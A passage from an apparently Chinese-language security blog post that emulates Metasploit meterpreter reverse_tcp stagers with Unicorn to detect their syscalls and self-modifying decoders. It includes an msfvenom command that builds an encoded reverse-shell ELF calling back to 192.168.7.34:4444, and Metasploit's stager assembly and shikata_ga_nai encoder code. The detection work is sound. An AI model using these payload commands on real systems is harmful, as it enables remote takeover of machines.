class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HookSyscall</span><span class="params">(object)</span>:</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">self.c2Server = <span class="literal">None</span></span><br><span class="line">self.protectAddr = <span class="number">0</span></span><br><span class="line">self.writeAddr = <span class="number">0</span> </span><br><span class="line">self.addrLen = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">self.dupList = set() <span class="comment"># dup2</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ip2Str</span><span class="params">(self,num)</span>:</span></span><br><span class="line">s = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">s.append(str( num%<span class="number">256</span> ))</span><br><span class="line">num //= <span class="number">256</span></span><br><span class="line"><span class="keyword">return</span> <span class="string">'.'</span>.join(s[::<span class="number">-1</span>])</span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">__call__</span><span class="params">(self,uc,user_data)</span>:</span></span><br><span class="line"><span class="comment"># pass</span></span><br><span class="line">rax = uc.reg_read(UC_X86_REG_RAX)</span><br><span class="line">rdi = uc.reg_read(UC_X86_REG_RDI)</span><br><span class="line">rsi = uc.reg_read(UC_X86_REG_RSI)</span><br><span class="line">rdx = uc.reg_read(UC_X86_REG_RDX)</span><br><span class="line">r10 = uc.reg_read(UC_X86_REG_R10)</span><br><span class="line">r8 = uc.reg_read(UC_X86_REG_R8)</span><br><span class="line">r9 = uc.reg_read(UC_X86_REG_R9)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">print( <span class="string">"[*] rax:\t&#123;&#125;,rdi:\t&#123;&#125;,rsi:\t&#123;&#125;,rdx:\t&#123;&#125;,r10:\t&#123;&#125;"</span>.format(  </span><br><span class="line">hex(rax),rdi,rsi,rdx,r10</span><br><span class="line">) )</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> rax == <span class="number">0x09</span>:</span><br><span class="line"><span class="comment"># # syscall mmap</span></span><br><span class="line"><span class="comment"># if debug:</span></span><br><span class="line"><span class="comment"># print("[-] mmap")</span></span><br><span class="line">PROT_EXEC = <span class="number">0x04</span></span><br><span class="line">PROT_WRITE = <span class="number">0x02</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> rdx &amp; PROT_EXEC <span class="keyword">and</span> rdx &amp; PROT_WRITE:</span><br><span class="line"><span class="comment"># 返回一个地址</span></span><br><span class="line">rip = uc.reg_read(UC_X86_REG_RIP)</span><br><span class="line">self.protectAddr =  (rip &gt;&gt; <span class="number">12</span> &lt;&lt; <span class="number">12</span>) + <span class="number">4</span>*<span class="number">0x1000</span></span><br><span class="line">self.addrLen = rsi</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">print(<span class="string">"[-] mmap size: &#123;&#125;,permit: &#123;&#125; , addr: &#123;&#125; "</span>.format( rsi,rdx &amp; <span class="number">0b111</span>,self.protectAddr ))</span><br><span class="line"></span><br><span class="line">uc.reg_write(UC_X86_REG_RAX,self.protectAddr)</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> rax == <span class="number">0x2b</span>:</span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">print(<span class="string">"[-] listen"</span>)</span><br><span class="line"></span><br><span class="line">uc.reg_write(UC_X86_REG_RAX,<span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> rax == <span class="number">0x29</span>:</span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">print(<span class="string">"[-] socket"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> rax == <span class="number">0x21</span>:</span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">print(<span class="string">"[-] dup2 , &#123;&#125;-&gt;&#123;&#125;"</span>.format( rdi, rsi)) </span><br><span class="line">self.dupList.add( rsi )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> rax == <span class="number">0x2a</span> <span class="keyword">or</span> rax == <span class="number">0x31</span>:</span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">print(<span class="string">"[-] connect or bind!"</span>)</span><br><span class="line">sockaddr_in_addr = rsi</span><br><span class="line"></span><br><span class="line">sockaddr_in_str = <span class="string">"&gt;2HI"</span></span><br><span class="line">tmp = uc.mem_read(sockaddr_in_addr, struct.calcsize(sockaddr_in_str) )</span><br><span class="line">sockaddr_in = struct.unpack(sockaddr_in_str,tmp)</span><br><span class="line"><span class="comment"># print(tmp)</span></span><br><span class="line"></span><br><span class="line">uc.reg_write(UC_X86_REG_RAX,<span class="number">0x0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># print(sockaddr_in)</span></span><br><span class="line"></span><br><span class="line">port  = sockaddr_in[<span class="number">1</span>]</span><br><span class="line">addr = self.ip2Str(sockaddr_in[<span class="number">2</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">print(<span class="string">"[-] c2 Server &#123;&#125;:&#123;&#125;"</span>.format( addr,port ))</span><br><span class="line">self.c2Server = <span class="string">"&#123;&#125;:&#123;&#125;"</span>.format(addr,port)</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> rax == <span class="number">0x00</span>:</span><br><span class="line">print(<span class="string">"[-] read"</span>)</span><br><span class="line">self.writeAddr = rsi</span><br><span class="line"></span><br><span class="line">uc.reg_write(UC_X86_REG_RAX,<span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># if rax ==</span></span><br><span class="line"></span><br><span class="line">uc.reg_write(UC_X86_REG_RAX,<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="literal">True</span></span><br></pre></td></tr></table></figure><p>添加hook:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">hookSyscall = HookSyscall()</span><br><span class="line">emu.hook_add(UC_HOOK_INSN, hookSyscall, <span class="literal">None</span>, <span class="number">1</span>, <span class="number">0</span>, UC_X86_INS_SYSCALL)</span><br></pre></td></tr></table></figure><p>然后运行，就可以看到监控到的syscall参数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">0x40008d:     syscall</span><br><span class="line">[*] rax:        0x9L,rdi:       0,rsi:  4096,rdx:       4103,r10:       34</span><br><span class="line">[-] mmap size: 4096,permit: 7 , addr: 4210688 </span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">0x4000a3:     syscall</span><br><span class="line">[*] rax:        0x29L,rdi:      2,rsi:  1,rdx:  0,r10:  34</span><br><span class="line">[-] socket</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">0x4000c0:     syscall</span><br><span class="line">[*] rax:        0x2aL,rdi:      41,rsi: 9437168,rdx:    16,r10: 34</span><br><span class="line">[-] connect or bind!</span><br><span class="line">[-] c2 Server 192.168.7.34:4444</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">0x4000f1:     syscall</span><br><span class="line">[*] rax:        0x0L,rdi:       41,rsi: 4210688,rdx:    126,r10:        34</span><br><span class="line">[-] read</span><br><span class="line">0x4000f3:     test    rax, rax</span><br><span class="line">0x4000f6:     js      0x4000e5</span><br><span class="line">0x4000f8:     jmp     rsi</span><br></pre></td></tr></table></figure><p>可以看到加载远程的shellcode主要分为五个步骤:</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span> mmap 申请一块rwx权限的内存空间,地址为A </span><br><span class="line"><span class="number">2.</span> socket  创建一个socket</span><br><span class="line"><span class="number">3.</span> connect 连接一个socket</span><br><span class="line"><span class="number">4.</span> read 读取远程数据写到A</span><br><span class="line"><span class="number">5.</span> jmp A 执行代码</span><br></pre></td></tr></table></figure><p>整个过程还是比较简单的。</p><h2 id="编码器的执行过程分析"><a href="#编码器的执行过程分析" class="headerlink" title="编码器的执行过程分析"></a>编码器的执行过程分析</h2><p>metepreter 的二进制编码器都是使用SMC代码来实现恶意代码的隐藏，本文使用效果excellent的编码器 <code>x86/shikata_ga_nai</code> 进行示例，接下里的代码一定要使用我patch过的unicorn才能获得预期的效果。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom  -p  linux/x64/meterpreter/reverse_tcp  LHOST=192.168.7.34 LPORT=4444 -e x86/shikata_ga_nai -i 1  -f elf &gt; tese_encoder.elf</span><br></pre></td></tr></table></figure><p>看一下生成的代码:</p><p><img src="https://pic.wonderkun.cc/uploads/2021/04/2021-04-25-14-28-06.png" alt=""></p><p>很明显: </p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">LOAD:</span><span class="number">000000000040007D</span>                 <span class="keyword">fcmovb</span>  <span class="built_in">st</span>, <span class="built_in">st</span>(<span class="number">2</span>)</span><br><span class="line"><span class="symbol">LOAD:</span>000000000040007F                 <span class="keyword">fnstenv</span> [<span class="built_in">rsp</span>+var_C]</span><br><span class="line"><span class="symbol">LOAD:</span><span class="number">0000000000400083</span>                 <span class="keyword">pop</span>     <span class="built_in">rbx</span></span><br></pre></td></tr></table></figure><p>获取了下一条指令的地址(当前的RIP)存储在了rbx中，然后调整偏移和esi异或来进行代码修改：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">LOAD:0000000000400084                 sub     ecx, ecx</span><br><span class="line">LOAD:0000000000400086                 mov     cl, 21h ; <span class="string">'!'</span></span><br><span class="line">LOAD:0000000000400088                 sub     ebx, 0FFFFFFFCh</span><br><span class="line">LOAD:000000000040008B                 xor     [rbx+10h], esi</span><br></pre></td></tr></table></figure><p>经过测试，此编码器每次生成的密钥都不同，也就是这条指令<code>mov esi, 0EF034529h</code>，剩下的流程都是一样的，包括需要解密的长度，一直都是 <code>mov cl, 21h</code>。</p><p>仅依靠静态来识别此编码器还是比较简单的，但是想要识别编码器的混用或者自定义的编码器，静态可能就力不从心了，所以我们下面写代码来识别出这种自修改代码。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 添加如下hook函数</span></span><br><span class="line">emu.hook_add(UC_HOOK_MEM_WRITE, hook_smc_check)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">write_bounds = [<span class="literal">None</span>, <span class="literal">None</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hook_smc_check</span><span class="params">(uc, access, address, size, value, user_data)</span>:</span></span><br><span class="line">SMC_BOUND = <span class="number">0x200</span></span><br><span class="line">rip = uc.reg_read(UC_X86_REG_RIP)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Just check if the write target addr is near EIP</span></span><br><span class="line"><span class="keyword">if</span> abs(rip - address) &lt; SMC_BOUND:</span><br><span class="line"><span class="keyword">if</span> write_bounds[<span class="number">0</span>] == <span class="literal">None</span>:</span><br><span class="line">write_bounds[<span class="number">0</span>] = address</span><br><span class="line">write_bounds[<span class="number">1</span>] = address</span><br><span class="line"><span class="keyword">elif</span> address &lt; write_bounds[<span class="number">0</span>]:</span><br><span class="line">write_bounds[<span class="number">0</span>] = address</span><br><span class="line"><span class="keyword">elif</span> address &gt; write_bounds[<span class="number">1</span>]:</span><br><span class="line">write_bounds[<span class="number">1</span>] = address</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> write_bounds[<span class="number">0</span>] != <span class="literal">None</span>:</span><br><span class="line">  <span class="comment"># print("Shellcode address ranges:")</span></span><br><span class="line">  <span class="comment"># print("   low:  0x%X" % write_bounds[0])</span></span><br><span class="line">  <span class="comment"># print("   high: 0x%X" % write_bounds[1])</span></span><br><span class="line">  <span class="comment"># print("")</span></span><br><span class="line">  <span class="comment"># print("Decoded shellcode:")</span></span><br><span class="line">  mem = emu.mem_read(write_bounds[<span class="number">0</span>], (write_bounds[<span class="number">1</span>] - write_bounds[<span class="number">0</span>]))</span><br><span class="line">  emu.disasm.disas_all(mem, write_bounds[<span class="number">0</span>])</span><br></pre></td></tr></table></figure><p>这样就会完整的dump修改之后的代码，这个修改后的代码和之前生成的代码是相同的。x86系统调用的是<code>int 80</code>中断，其实原理都是一样的， 所以不再赘述。到这里基本的原理和代码都已经讲完了，随便自己再完善一下就可以实现metasploit生成的后门的模拟执行检测了。</p><h2 id="Metasploit生成shellcode的过程"><a href="#Metasploit生成shellcode的过程" class="headerlink" title="Metasploit生成shellcode的过程"></a>Metasploit生成shellcode的过程</h2><h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><p><code>msfvenom</code> 文件的路径在 <code>metasploit-framework/embedded/framework/msfvenom</code>,跟踪这个文件的中的执行流程，当 payload 为 <code>linux/x86/meterpreter/reverse_tcp</code> 会执行到文件 <code>metasploit-framework/embedded/framework/lib/msf/core/payload/linux/reverse_tcp_x86.rb</code>。</p><ul><li>函数 <code>asm_reverse_tcp</code> 就是生成 shellcode 主函数</li></ul><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">asm_reverse_tcp</span><span class="params">(opts=&#123;&#125;)</span></span></span><br><span class="line">  <span class="comment"># <span class="doctag">TODO:</span> reliability is coming</span></span><br><span class="line">  retry_count  = opts[<span class="symbol">:retry_count</span>]</span><br><span class="line">  encoded_port = <span class="string">"0x%.8x"</span> % [opts[<span class="symbol">:port</span>].to_i, <span class="number">2</span>].pack(<span class="string">"vn"</span>).unpack(<span class="string">"N"</span>).first</span><br><span class="line">  encoded_host = <span class="string">"0x%.8x"</span> % Rex::Socket.addr_aton(opts[<span class="symbol">:host</span>]<span class="params">||</span><span class="string">"127.127.127.127"</span>).unpack(<span class="string">"V"</span>).first</span><br><span class="line">  seconds = (opts[<span class="symbol">:sleep_seconds</span>] <span class="params">||</span> <span class="number">5.0</span>)</span><br><span class="line">  sleep_seconds = seconds.to_i</span><br><span class="line">  sleep_nanoseconds = (seconds % <span class="number">1</span> * <span class="number">1000000000</span>).to_i</span><br><span class="line"></span><br><span class="line">  mprotect_flags = 0b111 <span class="comment"># PROT_READ | PROT_WRITE | PROT_EXEC</span></span><br></pre></td></tr></table></figure><p>获取重试次数、sleep时间，反弹地址和端口等参数信息。</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">if</span> respond_to?(<span class="symbol">:generate_intermediate_stage</span>)</span><br><span class="line">  pay_mod = framework.payloads.create(<span class="keyword">self</span>.refname)</span><br><span class="line">  puts <span class="string">"datastore:"</span>,datastore,<span class="string">"\n"</span></span><br><span class="line"></span><br><span class="line">  payload = pay_mod.generate_stage(datastore.to_h)</span><br><span class="line">  </span><br><span class="line">  <span class="comment"># puts "payload:#&#123;payload.split(//).each &#123;|e|;print (e.unpack('H*').to_s)&#125;&#125;"</span></span><br><span class="line"></span><br><span class="line">  read_length = pay_mod.generate_intermediate_stage(pay_mod.generate_stage(datastore.to_h)).size</span><br><span class="line"><span class="keyword">elsif</span> !module_info[<span class="string">'Stage'</span>][<span class="string">'Payload'</span>].empty?</span><br><span class="line">  read_length = module_info[<span class="string">'Stage'</span>][<span class="string">'Payload'</span>].size</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  <span class="comment"># If we don't know, at least use small instructions</span></span><br><span class="line">  read_length = <span class="number">0x0c00</span> + mprotect_flags</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><p>此代码只是为了计算下一个控制阶段所要使用的 shellcode 的长度，在这里生成的shellcode不会在本次loader阶段下发。</p><p>接着就是 shellcode :</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line">asm = %Q^</span><br><span class="line">    push <span class="comment">#&#123;retry_count&#125;        ; retry counter</span></span><br><span class="line">    pop esi</span><br><span class="line">  <span class="symbol">create_socket:</span></span><br><span class="line">    xor ebx, ebx</span><br><span class="line">    mul ebx</span><br><span class="line">    push ebx</span><br><span class="line">    inc ebx</span><br><span class="line">    push ebx</span><br><span class="line">    push <span class="number">0x2</span></span><br><span class="line">    mov al, <span class="number">0x66</span></span><br><span class="line">    mov ecx, esp</span><br><span class="line">    int <span class="number">0x80</span>                   ; sys_socketcall (socket())</span><br><span class="line">    xchg eax, edi              ; store the socket <span class="keyword">in</span> edi</span><br><span class="line"></span><br><span class="line">  <span class="symbol">set_address:</span></span><br><span class="line">    pop ebx                    ; set ebx back to zero</span><br><span class="line">    push <span class="comment">#&#123;encoded_host&#125;</span></span><br><span class="line">    push <span class="comment">#&#123;encoded_port&#125;</span></span><br><span class="line">    mov ecx, esp</span><br><span class="line"></span><br><span class="line">  <span class="symbol">try_connect:</span></span><br><span class="line">    push <span class="number">0x66</span></span><br><span class="line">    pop eax</span><br><span class="line">    push eax</span><br><span class="line">    push ecx</span><br><span class="line">    push edi</span><br><span class="line">    mov ecx, esp</span><br><span class="line">    inc ebx</span><br><span class="line">    int <span class="number">0x80</span>                   ; sys_socketcall (connect())</span><br><span class="line">    test eax, eax</span><br><span class="line">    jns mprotect</span><br><span class="line"></span><br><span class="line">  <span class="symbol">handle_failure:</span></span><br><span class="line">    dec esi</span><br><span class="line">    jz failed</span><br><span class="line">    push <span class="number">0xa2</span></span><br><span class="line">    pop eax</span><br><span class="line">    push 0x<span class="comment">#&#123;sleep_nanoseconds.to_s(16)&#125;</span></span><br><span class="line">    push 0x<span class="comment">#&#123;sleep_seconds.to_s(16)&#125;</span></span><br><span class="line">    mov ebx, esp</span><br><span class="line">    xor ecx, ecx</span><br><span class="line">    int <span class="number">0x80</span>                   ; sys_nanosleep</span><br><span class="line">    test eax, eax</span><br><span class="line">    jns create_socket</span><br><span class="line">    jmp failed</span><br><span class="line">^</span><br><span class="line"></span><br><span class="line">asm &lt;&lt; asm_send_uuid <span class="keyword">if</span> include_send_uuid</span><br><span class="line"></span><br><span class="line">asm &lt;&lt; %Q^</span><br><span class="line">  <span class="symbol">mprotect:</span></span><br><span class="line">    mov dl, 0x<span class="comment">#&#123;mprotect_flags.to_s(16)&#125;</span></span><br><span class="line">    mov ecx, <span class="number">0x1000</span></span><br><span class="line">    mov ebx, esp</span><br><span class="line">    shr ebx, <span class="number">0xc</span></span><br><span class="line">    shl ebx, <span class="number">0xc</span></span><br><span class="line">    mov al, <span class="number">0x7d</span></span><br><span class="line">    int <span class="number">0x80</span>                  ; sys_mprotect</span><br><span class="line">    test eax, eax</span><br><span class="line">    js failed</span><br><span class="line"></span><br><span class="line">  <span class="symbol">recv:</span></span><br><span class="line">    pop ebx</span><br><span class="line">    mov ecx, esp</span><br><span class="line">    cdq</span><br><span class="line">    mov <span class="comment">#&#123;read_reg&#125;,  0x#&#123;read_length.to_s(16)&#125;</span></span><br><span class="line">    mov al, <span class="number">0x3</span></span><br><span class="line">    int <span class="number">0x80</span>                  ; sys_read (recv())</span><br><span class="line">    test eax, eax</span><br><span class="line">    js failed</span><br><span class="line">    jmp ecx</span><br><span class="line"></span><br><span class="line">  <span class="symbol">failed:</span></span><br><span class="line">    mov eax, <span class="number">0x1</span></span><br><span class="line">    mov ebx, <span class="number">0x1</span>              ; set exit status to <span class="number">1</span></span><br><span class="line">    int <span class="number">0x80</span>                  ; sys_exit</span><br><span class="line">^</span><br><span class="line"></span><br><span class="line">asm</span><br></pre></td></tr></table></figure><p>这个代码之前就分析过，这里看起来就非常熟悉了。</p><h3 id="encoder"><a href="#encoder" class="headerlink" title="encoder"></a>encoder</h3><p>上一步是生成 payload, 接下来这一步就是利用 encoder 对 payload 进行编码，</p><p>encoder <code>x86/shikata_ga_nai</code> 的代码路径是 <code>metasploit-framework/embedded/framework/modules/encoders/x86/shikata_ga_nai.rb</code>:</p><p>函数 <code>decoder_stub</code> 是关键，主要作用是生成 shellcode 解码的头部: </p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decoder_stub</span><span class="params">(state)</span></span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># If the decoder stub has not already been generated for this state, do</span></span><br><span class="line">  <span class="comment"># it now.  The decoder stub method may be called more than once.</span></span><br><span class="line">  <span class="keyword">if</span> (state.decoder_stub == <span class="literal">nil</span>)</span><br><span class="line">    <span class="comment"># Sanity check that saved_registers doesn't overlap with modified_registers</span></span><br><span class="line">    <span class="keyword">if</span> (modified_registers &amp; saved_registers).length &gt; <span class="number">0</span></span><br><span class="line">      raise BadGenerateError</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Shikata will only cut off the last 1-4 bytes of it's own end</span></span><br><span class="line">    <span class="comment"># depending on the alignment of the original buffer</span></span><br><span class="line">    cutoff = <span class="number">4</span> - (state.buf.length &amp; <span class="number">3</span>)</span><br><span class="line">    block = generate_shikata_block(state, state.buf.length + cutoff, cutoff) <span class="params">||</span> (raise BadGenerateError)</span><br><span class="line">    <span class="comment"># Set the state specific key offset to wherever the XORK ended up.</span></span><br><span class="line">    state.decoder_key_offset = block.index(<span class="string">'XORK'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Take the last 1-4 bytes of shikata and prepend them to the buffer</span></span><br><span class="line">    <span class="comment"># that is going to be encoded to make it align on a 4-byte boundary.</span></span><br><span class="line">    state.buf = block.slice!(block.length - cutoff, cutoff) + state.buf</span><br><span class="line">    <span class="comment"># Cache this decoder stub.  The reason we cache the decoder stub is</span></span><br><span class="line">    <span class="comment"># because we need to ensure that the same stub is returned every time</span></span><br><span class="line">    <span class="comment"># for a given encoder state.</span></span><br><span class="line">    state.decoder_stub = block</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  state.decoder_stub</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><p>先不看 <code>generate_shikata_block</code> 函数的实现，先打印一下 <code>block</code> 内容和最后生成的 elf 文件：</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">block: "<span class="symbol">\x</span>DB<span class="symbol">\x</span>CB<span class="symbol">\x</span>BFXORK<span class="symbol">\x</span>D9t$<span class="symbol">\x</span>F4]3<span class="symbol">\x</span>C9<span class="symbol">\x</span>B1<span class="symbol">\x</span>1F1&#125;<span class="symbol">\x</span>1A<span class="symbol">\x</span>83<span class="symbol">\x</span>ED<span class="symbol">\x</span>FC<span class="symbol">\x</span>03&#125;<span class="symbol">\x</span>16<span class="symbol">\x</span>E2<span class="symbol">\x</span>F5"</span><br></pre></td></tr></table></figure><p><img src="https://pic.wonderkun.cc/uploads/2021/04/2021-05-15-16-44-18.png" alt=""></p><p>可以看到 <code>block</code> 的代码就是 <code>fpu</code> 和 getPC 功能的代码，其中 